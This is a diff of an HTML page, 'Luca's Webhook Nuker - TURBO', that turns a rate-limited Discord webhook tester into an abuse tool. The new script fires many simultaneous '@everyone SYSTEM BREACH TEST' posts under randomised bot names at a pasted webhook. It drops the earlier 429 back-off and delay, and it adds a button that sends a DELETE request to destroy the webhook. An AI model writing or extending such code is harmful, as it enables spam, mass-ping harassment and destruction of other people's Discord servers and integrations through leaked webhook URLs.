@@ -1,162 +1,75 @@
-DOCTYPE html>
+<!DOCTYPE html>
 <html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Luca's Webhook Nuker</title>
+    <title>Luca's Webhook Nuker - TURBO</title>
     <style>
-        body {
-            background-color: #0a0a0a;
-            color: #ffffff;
-            font-family: 'Courier New', Courier, monospace;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            height: 100vh;
-            margin: 0;
-            overflow: hidden;
-        }
-
-        /* The Neon Glowing Table Container */
-        .nuke-box {
-            border: 3px solid #39ff14;
-            box-shadow: 0 0 20px #39ff14, inset 0 0 15px rgba(57, 255, 20, 0.3);
-            padding: 40px;
-            border-radius: 20px;
-            background: rgba(0, 0, 0, 0.9);
-            text-align: center;
-            width: 450px;
-            transition: transform 0.3s ease;
-        }
-
-        .nuke-box:hover {
-            transform: scale(1.02);
-        }
-
-        h1 {
-            color: #39ff14;
-            text-shadow: 0 0 15px #39ff14, 0 0 30px #1a7a0a;
-            font-size: 2rem;
-            margin-bottom: 30px;
-            letter-spacing: 2px;
-            text-transform: uppercase;
-        }
-
-        label {
-            display: block;
-            color: #39ff14;
-            font-size: 0.9rem;
-            margin-bottom: 5px;
-            text-align: left;
-            margin-left: 5%;
-        }
-
-        input {
-            width: 90%;
-            padding: 12px;
-            margin: 10px 0 20px 0;
-            background: #1a1a1a;
-            border: 1px solid #39ff14;
-            color: #39ff14;
-            border-radius: 8px;
-            outline: none;
-            box-shadow: inset 0 0 5px #39ff14;
-        }
-
-        input:focus {
-            box-shadow: 0 0 10px #39ff14, inset 0 0 5px #39ff14;
-        }
-
-        button {
-            background: transparent;
-            color: #39ff14;
-            border: 2px solid #39ff14;
-            padding: 15px 30px;
-            font-size: 1.1rem;
-            font-weight: bold;
-            cursor: pointer;
-            border-radius: 10px;
-            margin-top: 10px;
-            text-transform: uppercase;
-            transition: all 0.4s;
-            width: 95%;
-        }
-
-        button:hover {
-            background: #39ff14;
-            color: #000;
-            box-shadow: 0 0 30px #39ff14;
-        }
-
-        #status {
-            margin-top: 20px;
-            color: #888;
-            font-size: 0.85rem;
-            height: 20px;
-        }
+        body { background-color: #0a0a0a; color: #ffffff; font-family: 'Courier New', monospace; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; overflow: hidden; }
+        .nuke-box { border: 3px solid #39ff14; box-shadow: 0 0 20px #39ff14, inset 0 0 10px rgba(57, 255, 20, 0.2); padding: 40px; border-radius: 20px; background: rgba(0,0,0,0.95); text-align: center; width: 420px; }
+        h1 { color: #39ff14; text-shadow: 0 0 10px #39ff14; font-size: 1.8rem; margin-bottom: 20px; text-transform: uppercase; }
+        input { width: 90%; padding: 12px; margin: 10px 0; background: #111; border: 1px solid #39ff14; color: #39ff14; border-radius: 8px; outline: none; }
+        .btn-container { display: flex; flex-direction: column; gap: 10px; margin-top: 10px; }
+        button { width: 100%; padding: 15px; cursor: pointer; font-weight: bold; border-radius: 10px; text-transform: uppercase; transition: 0.3s; font-size: 1rem; }
+        .spam-btn { background: transparent; color: #39ff14; border: 2px solid #39ff14; }
+        .spam-btn:hover { background: #39ff14; color: black; box-shadow: 0 0 25px #39ff14; }
+        .del-btn { background: transparent; color: #ff073a; border: 2px solid #ff073a; font-size: 0.8rem; }
+        .del-btn:hover { background: #ff073a; color: white; box-shadow: 0 0 15px #ff073a; }
+        #status { margin-top: 20px; font-size: 0.85rem; color: #888; min-height: 1.2em; }
     </style>
 </head>
 <body>
 
 <div class="nuke-box">
-    <h1>Luca's Webhook Nuker</h1>
+    <h1>Luca's Nuker</h1>
+    <label style="color:#39ff14; font-size: 0.8rem; display: block; text-align: left; margin-left: 5%;">Webhook URL:</label>
+    <input type="text" id="webhook" placeholder="Paste Discord URL here...">
     
-    <label for="webhook">Enter Webhook...</label>
-    <input type="text" id="webhook" placeholder="https://discord.com/api/webhooks/...">
+    <label style="color:#39ff14; font-size: 0.8rem; display: block; text-align: left; margin-left: 5%;">Message Count:</label>
+    <input type="number" id="count" value="100">
 
-    <label for="count">How many messages?</label>
-    <input type="number" id="count" value="1" min="1" max="100">
-
-    <button onclick="startAction()">Execute Test</button>
-    <p id="status"></p>
+    <div class="btn-container">
+        <button class="spam-btn" onclick="fireTurbo()">Execute Turbo Spam</button>
+        <button class="del-btn" onclick="terminate()">Delete Webhook</button>
+    </div>
+    <p id="status">Status: Standing by...</p>
 </div>
 
 <script>
-    async function startAction() {
+    function fireTurbo() {
         const url = document.getElementById('webhook').value;
         const count = parseInt(document.getElementById('count').value);
         const status = document.getElementById('status');
 
-        if (!url.startsWith('https://')) {
-            status.innerText = "Error: Invalid Webhook URL";
-            status.style.color = "red";
+        if (!url.includes('discord.com/api/webhooks/')) {
+            status.innerText = "INVALID WEBHOOK!";
+            status.style.color = "#ff073a";
             return;
         }
 
+        status.innerText = "ATTACKING... (Check Discord)";
         status.style.color = "#39ff14";
-        
+
+        // Wir feuern alle Requests gleichzeitig ab
         for (let i = 0; i < count; i++) {
-            status.innerText = `Sending message ${i + 1} of ${count}...`;
-
-            // Randomizing bot names to simulate different bots
-            const botNames = ["Nexus-Bot", "Glitch-Runner", "Neon-Striker", "Cyborg-X", "Shadow-Script"];
-            const randomName = botNames[Math.floor(Math.random() * botNames.length)] + " " + Math.floor(Math.random() * 999);
-
-            const payload = {
-                username: randomName,
-                content: `Test Message #${i + 1} - System Online.`
-            };
-
-            try {
-                const response = await fetch(url, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify(payload)
-                });
-
-                if (response.status === 429) {
-                    status.innerText = "Rate Limited! Waiting...";
-                    await new Promise(r => setTimeout(r, 2000)); // Wait 2 seconds if Discord says slow down
-                }
-            } catch (error) {
-                console.error("Transmission error:", error);
-            }
-            
-            // 200ms delay to keep the connection stable
-            await new Promise(r => setTimeout(r, 200)); 
+            const randomID = Math.random().toString(36).substring(2, 8);
+            fetch(url, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    username: "Nuker-Bot-" + randomID,
+                    content: "@everyone SYSTEM BREACH TEST #" + (i + 1) + " [" + randomID + "]"
+                })
+            }).catch(() => {}); 
         }
+    }
 
-        status.innerText = "All messages dispatched successfully.";
+    async function terminate() {
+        const url = document.getElementById('webhook').value;
+        if(confirm("PERMANENTLY DELETE THIS WEBHOOK?")) {
+            const res = await fetch(url, { method: 'DELETE' });
+            document.getElementById('status').innerText = res.ok ? "WEBHOOK DESTROYED!" : "ERROR DELETING.";
+        }
     }
 </script>
 
